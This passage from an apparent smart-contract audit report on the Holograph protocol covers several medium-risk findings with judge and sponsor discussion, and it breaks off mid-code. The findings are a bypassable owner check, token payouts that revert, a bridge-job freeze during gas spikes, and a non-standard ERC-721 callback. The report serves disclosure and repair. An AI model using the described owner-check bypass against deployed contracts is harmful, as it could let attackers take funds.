pass owner’s address.When the implementation, SourceERC721(), gets called, beforeSafeTransfer / afterSafeTransfer will behave as if they are called by owner.</p>\n<p>Therefore, depending on the actual implementation, derived contracts can lose funds by specifying owner-specific logic.</p>\n<p>This pattern occurs with the following functions, which have an arbitrary data parameter:</p>\n<ul>\n<li>beforeSafeTransfer / after SafeTransfer</li>\n<li>beforeTransfer / afterTransfer</li>\n<li>beforeOnERC721Received / afterOnERC721Received</li>\n<li>beforeOnERC20Received / aferERC20Received</li>\n</ul>\n<h3 id=\"impact-5\" style=\"position:relative;\"><a href=\"#impact-5\" aria-label=\"impact 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Owner-specific functionality can be initiated on NFT / ERC20 implementation contracts.</p>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Refactor the code to represent <code>msg.sender</code> information in a bug-free way.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1295213520\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Those function do not have the <code>onlyOwner</code> modifier so this doesn’t seems to be valid. e.g.\n<a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/abstract/StrictERC20H.sol#L220-L228\">StrictERC20H.sol#L220-L228</a></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1295249488\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>isOwner and onlyOwner are utilities implemented in ERC721H, to be used in implementation contracts. The actual implementations are out of scope, and defined by NFT / ERC20 creators. We can see such an example in the SampleERC721.sol file, which indeed uses onlyOwner:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function mint(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint224 tokenId,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    string calldata URI</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) external onlyHolographer onlyOwner {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    HolographERC721Interface H721 = HolographERC721Interface(holographer());</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (tokenId == 0) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      _currentTokenId += 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      while (H721.exists(uint256(_currentTokenId)) || H721.burned(uint256(_currentTokenId))) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _currentTokenId += 1;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      tokenId = _currentTokenId;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    H721.sourceMint(to, tokenId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 id = H721.sourceGetChainPrepend() + uint256(tokenId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _tokenURIs[id] = URI;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>The submission proves that these modifiers, which ARE in scope, are NOT safe to use in certain function implementations, as they can be bypassed. Since there is no warning label to not use those utilities in the list of functions I mentioned, this could potentially result in real damage to the protocol.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1295834895\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Is there a codepath that the Holographer will call mint without appending sender address? This might be easy to misuse (which I doubt) but would be QA at best. Imo the modifier is working as intended and it is the developers responsibility to understand the consequences of making a call from the Holographer (which is a privileged account) regardless. Everything can be misused does not mean they are Med/High risk unless you can provide an actual exploit.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1295842157\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>I have brought up mint() as an example of using onlyOwner in the ERC721 implementation. I will reiterate that the issue is confusion between calls coming from HolographERC721’s fallback function, and calls from Enforcer’s transferFrom / safeTransferFrom / etc. When the list of functions above (beforeTransferFrom/ afterTransferFrom / etc) are called NOT from the fallback, which happens in transferFrom / safeTransferFrom / onERC20Received, the sender can pass any “data” parameter they wish, which will be interpreted by the isOwner function as the passed sender in the last 32 bytes.</p>\n<p>“Everything can be misused does not mean they are Med/High risk unless you can provide an actual exploit.” - The problem is that it will NOT be developer misuse to use isOwner / onlyOwner in ERC721/ERC20 implementation, it’s use of inherited functionality (like in SampleERC721.sol example). There is no warning that owner check is not safe from “beforeOnERC20Received”, for example.  Protocol is likely shooting themselves in the foot if they don’t protect from owner checks in these functions.</p>\n<p>If it is required I have no problem coding example innocent ERC20/ERC721 implementation that is vulnerable to the attack.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1296062620\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>I will reopen this to let sponsor comment, but intended to judge as QA. Will review when judging.</p>\n</blockquote>\n<p>Also they can’t manipulate unless it is called from the Holographer, which have limited affordance.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1306627521\">alexanderattar (Holograph) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>This is a valid find. We will revisit the isOwner / onlyOwner modifiers and ensure this is handled appropriately so developers inheriting the mentioned Holograph contracts don’t accidentally introduce unexpected logic in their contracts</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/464#issuecomment-1320038876\">ACC01ADE (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>Fixing this by ensuring that any calls to implementation contracts from HolographERC20 and HolographERC721 do not call directly, but first have the caller attached to end of calldata so that isOwner and onlyOwner are consistent.</p>\n<p><a href=\"https://github.com/holographxyz/holograph-protocol/pull/88\">Feature/HOLO-605: C4 medium risk fixes</a></p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-_payouttokens-is-not-compatible-with-tokens-with-missing-return-value\" style=\"position:relative;\"><a href=\"#m-02-_payouttokens-is-not-compatible-with-tokens-with-missing-return-value\" aria-label=\"m 02 _payouttokens is not compatible with tokens with missing return value permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/456\">[M-02] <code>_payoutToken[s]()</code> is not compatible with tokens with missing return value</a></h2>\n<p><em>Submitted by d3e4, also found by __141345__, 2997ms, ballx, Bnke0x0, brgltd, brgltd, cccz, cccz, chaduke, d3e4, Dinesh11G, Jeiwan, joestakey, Lambda, martin, pashov, RedOneN, Trust, V_B, and vv7</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/PA1D.sol#L317\">PA1D.sol#L317</a><br>\n<a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/enforcer/PA1D.sol#L340\">PA1D.sol#L340</a><br></p>\n<p>Payout is blocked and tokens are stuck in contract.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>PA1D._payoutToken()</code> and <code>PA1D._payoutTokens()</code> call <code>ERC20.transfer()</code> in a require-statement to send tokens to a list of payout recipients.<br>\nSome tokens do not return a bool (e.g. USDT, BNB, OMG) on ERC20 methods. But since the require-statement expects a <code>bool</code>, for such a token a <code>void</code> return will also cause a revert, despite an otherwise successful transfer. That is, the token payout will always revert for such tokens.</p>\n<h3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Use <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol\">OpenZeppelin’s SafeERC20</a>, which handles the return value check as well as non-standard-compliant tokens.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/456#issuecomment-1306632476\">alexanderattar (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>Low priority, but can be updated to ensure compatibility with all ERC20 tokens.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/456#issuecomment-1306632476\">alexanderattar (Holograph) linked a PR</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/holographxyz/holograph-protocol/pull/93\">Feature/holo 612 royalty smart contract improvements</a></p>\n</blockquote>\n<hr>\n<h2 id=\"m-03-beaming-job-might-freeze-on-dest-chain-under-some-conditions-leading-to-owner-losing-temporarily-access-to-token\" style=\"position:relative;\"><a href=\"#m-03-beaming-job-might-freeze-on-dest-chain-under-some-conditions-leading-to-owner-losing-temporarily-access-to-token\" aria-label=\"m 03 beaming job might freeze on dest chain under some conditions leading to owner losing temporarily access to token permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/170\">[M-03] Beaming job might freeze on dest chain under some conditions, leading to owner losing (temporarily) access to token</a></h2>\n<p><em>Submitted by 0xA5DF</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/src/HolographOperator.sol#L255\">HolographOperator.sol#L255</a><br></p>\n<p>If the following conditions have been met:</p>\n<ul>\n<li>The selected operator doesn’t complete the job, either intentionally (they’re sacrificing their bonded amount to harm the token owner) or innocently (hardware failure that caused a loss of access to the wallet)</li>\n<li>Gas price has spiked, and isn’t going down than the <code>gasPrice</code> set by the user in the bridge out request</li>\n</ul>\n<p>Then the bridging request wouldn’t complete and the token owner would loos access to the token till the gas price goes back down again.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The fact that no one but the selected operator can execute the job in case of a gas spike has been proven by the test <a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/test/14_holograph_operator_tests.ts#L834-L844\">‘Should fail if there has been a gas spike’</a> provided by the sponsor.</p>\n<p>An example of a price spike can be in the recent month in the Ethereum Mainnet where the min gas price was 3 at Oct 8, but jumped to 14 the day after and didn’t go down since then (the min on Oct 9 was lower than the avg of Oct8, but users might witness a momentarily low gas price and try to hope on it). See the <a href=\"https://etherscan.io/chart/gasprice\">gas price chat on Etherscan</a> for more details.</p>\n<h3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>In case of a gas price spike, instead of refusing to let other operators to execute the job, let them execute the job without slashing the selected operator. This way, after a while also the owner can execute the job and pay the gas price.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1296344314\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>If there is a gas spike, it is too expensive to execute the transaction, so we should not force executor to do it. I think it is intended behavior that TX just doesnt execute until gas falls back down.<br>\nThe docs state there is a refund mechanism that is activated in this case, back to origin chain.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1296346189\">0xA5DF (warden) commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p>The docs state there is a refund mechanism that is activated in this case, back to origin chain.</p>\n</blockquote>\n<p>Can you please point where in the docs does it state that?<br>\nAlso, regardless of the docs, that kind of mechanism is certainly not implemented.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1296349735\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://docs.holograph.xyz/holograph-protocol/operator-network-specification\">https://docs.holograph.xyz/holograph-protocol/operator-network-specification</a><br>\nOperator Job Selection:<br>\n“Operator jobs are given specific gas limits. This is meant to prevent gas spike abuse (e.g., as a form of DoS attack), bad code, or smart contract reverts from penalizing good-faith operators. If an operator is late to finalize a job and another operator steps in to take its place, if the gas price is above the set limit, the selected operator will not get slashed. A job is considered successful if it does not revert, or if it reverts but gas limits were followed correctly. Failed jobs can be re-done (for an additional fee), can be returned to origin chain (for an additional fee), or left untouched entirely. This shifts the financial responsibility towards users, rather than operators.”</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1296351047\">0xA5DF (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Thanks, wasn’t aware of that at time of submission.<br>\nBut the docs specifically talk about ‘failed jobs’, in this case the job wouldn’t even be marked as failed since nobody would be able to execute the <code>executeJob()</code> function (the <code>require(gasPrice >= tx.gasprice</code> would revert the entire function rather than move to the catch block)</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1296351620\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>I think the assumption is that tx.gasprice will eventually come back to a non-reverting amount. Agree that it seems like a good idea to add a force-fail after EXPIRY_NUM blocks passed, without executing the TX.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/170#issuecomment-1307835385\">alexanderattar (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>Agree that it seems like a good idea to add a force-fail after EXPIRY_NUM blocks passed, without executing the TX.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-incorrect-implementation-of-erc721-may-have-bad-consequences-for-receiver\" style=\"position:relative;\"><a href=\"#m-04-incorrect-implementation-of-erc721-may-have-bad-consequences-for-receiver\" aria-label=\"m 04 incorrect implementation of erc721 may have bad consequences for receiver permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/469\">[M-04] Incorrect implementation of ERC721 may have bad consequences for receiver</a></h2>\n<p><em>Submitted by Trust, also found by adriro</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/f8c2eae866280a1acfdc8a8352401ed031be1373/contracts/enforcer/HolographERC721.sol#L467\">HolographERC721.sol#L467</a><br></p>\n<p>HolographERC721.sol is an enforcer contract that fully implements ERC721. In its safeTransferFromFunction there is the following code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (_isContract(to)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  require(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (ERC165(to).supportsInterface(ERC165.supportsInterface.selector) &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      ERC165(to).supportsInterface(ERC721TokenReceiver.onERC721Received.selector) &amp;&amp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      ERC721TokenReceiver(to).onERC721Received(address(this), from, tokenId, data) ==</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      ERC721TokenReceiver.onERC721Received.selector),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    &quot;ERC721: onERC721Received fail&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>If the target address is a contract, the enforcer requires the target’s <code>onERC721Received()</code> to succeed. However, the call deviates from the <a href=\"https://eips.ethereum.org/EIPS/eip-721\">standard</a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">interface ERC721TokenReceiver {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @notice Handle the receipt of an NFT</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @dev The ERC721 smart contract calls this function on the recipient</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ///  after a `transfer`. This function MAY throw to revert and reject the</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ///  transfer. Return of other than the magic value MUST result in the</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ///  transaction being reverted.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ///  Note: the contract address is always the message sender.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @param _operator The address which called `safeTransferFrom` function</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @param _from The address which previously owned the token</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @param _tokenId The NFT identifier which is being transferred</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @param _data Additional data with no specified format</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @return `bytes4(keccak256(&quot;onERC721Received(address,address,uint256,bytes)&quot;))`</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ///  unless throwing</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>The standard mandates that the first parameter will be the operator - the caller of safeTransferFrom. The enforcer passes instead the <code>address(this)</code> value, in other words the Holographer address. The impact is that any bookkeeping done in target contract, and allow / disallow decision of the transaction, is based on false information.</p>\n<h3 id=\"impact-6\" style=\"position:relative;\"><a href=\"#impact-6\" aria-label=\"impact 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>ERC721 transferFrom’s “to” contract may fail to accept transfers, or record credit of transfers incorrectly.</p>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Pass the msg.sender parameter, as the ERC721 standard requires.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/469#issuecomment-1306626633\">alexanderattar (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>This will be updated to pass msg.sender instead of Holograph address to match the standard.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/469#ref-pullrequest-1452472274\">ACC01ADE (Holograph) linked a PR</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/holographxyz/holograph-protocol/pull/88\">Feature/HOLO-605: C4 medium risk fixes</a></p>\n</blockquote>\n<hr>\n<h2 id=\"m-05-it-is-possible-that-operator-loses-sent-eth-after-calling-holographoperator-contracts-executejob-function\" style=\"position:relative;\"><a href=\"#m-05-it-is-possible-that-operator-loses-sent-eth-after-calling-holographoperator-contracts-executejob-function\" aria-label=\"m 05 it is possible that operator loses sent eth after calling holographoperator contracts executejob function permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/418\">[M-05] It is possible that operator loses sent ETH after calling <code>HolographOperator</code> contract’s <code>executeJob</code> function</a></h2>\n<p><em>Submitted by rbserver</em></p>\n<p>ETH can be sent when calling the <code>HolographOperator</code> contract’s <code>executeJob</code> function, which can execute the following code.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">\\</span><span class=\"mtk12\">HolographOperator</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">419</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">try</span></span></span>\n<span 